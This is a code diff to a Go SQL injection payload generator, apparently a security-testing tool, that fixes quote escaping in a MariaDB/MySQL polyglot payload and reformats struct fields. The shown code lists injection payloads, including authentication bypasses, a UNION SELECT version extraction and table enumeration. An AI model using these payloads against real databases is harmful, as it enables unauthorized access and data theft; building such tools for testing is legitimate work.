@@ -30,7 +30,7 @@ type PolyglotWithDesc struct {
 func (g *PolyglotGenerator) GenerateUniversalPolyglots() []Polyglot {
 	return []Polyglot{
 		{
-			Payload:     "'="\"=\"",
+			Payload:     "'=\"\"=\"",
 			Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts",
 			DBMS:        []string{"MariaDB", "MySQL"},
 		},
@@ -263,7 +263,7 @@ func (g *PolyglotGenerator) GenerateSensitiveData() []string {
 		// Universal authentication bypass
 		"' OR '1'='1'",
 		// MariaDB/MySQL universal polyglot (6 bytes)
-		"'="\"=\"",
+		"'=\"\"=\"",
 		// Database version extraction (all DBMS)
 		"UNION SELECT @@version,NULL,NULL--",
 		// Table enumeration (MySQL)
@@ -331,9 +331,9 @@ func (g *PolyglotGenerator) HexEncode(s string) string {
 
 // GeneratePolyglotForContext generates a polyglot optimized for a specific injection context
 type InjectionContext struct {
-	QuoteType string   // single, double, none
-	DBMS      []string
-	PayloadType   string // auth_bypass, data_extraction, time_based, etc.
+	QuoteType   string // single, double, none
+	DBMS        []string
+	PayloadType string // auth_bypass, data_extraction, time_based, etc.
 }
 
 // GeneratePolyglotForContext generates a polyglot optimized for a specific injection context
@@ -369,7 +369,7 @@ func (g *PolyglotGenerator) GeneratePolyglotForContext(ctx InjectionContext) Pol
 	default:
 		if ctx.QuoteType == "double" {
 			return Polyglot{
-				Payload:     "'="\"=\"",
+				Payload:     "'=\"\"=\"",
 				Description: "Universal polyglot - works in both quote contexts",
 				DBMS:        []string{"MariaDB", "MySQL"},
 			}
@@ -475,14 +475,14 @@ func (g *PolyglotGenerator) GenerateWAFBypassAll() []string {
 func (g *PolyglotGenerator) GenerateCategories() map[string][]struct {
 	Description string `json:"description"`
 	Payload     string `json:"payload"`
-}{
+} {
 	return map[string][]struct {
 		Description string `json:"description"`
 		Payload     string `json:"payload"`
 	}{
 		// Universal polyglots - work across multiple DBMS and contexts
 		"universal": {
-			{Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts", Payload: "'="\"=\""},
+			{Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts", Payload: "'=\"\"=\""},
 			{Description: "Classic authentication bypass - always true condition", Payload: "' OR '1'='1'"},
 			{Description: "Numeric context authentication bypass", Payload: "1 OR 1=1"},
 		},
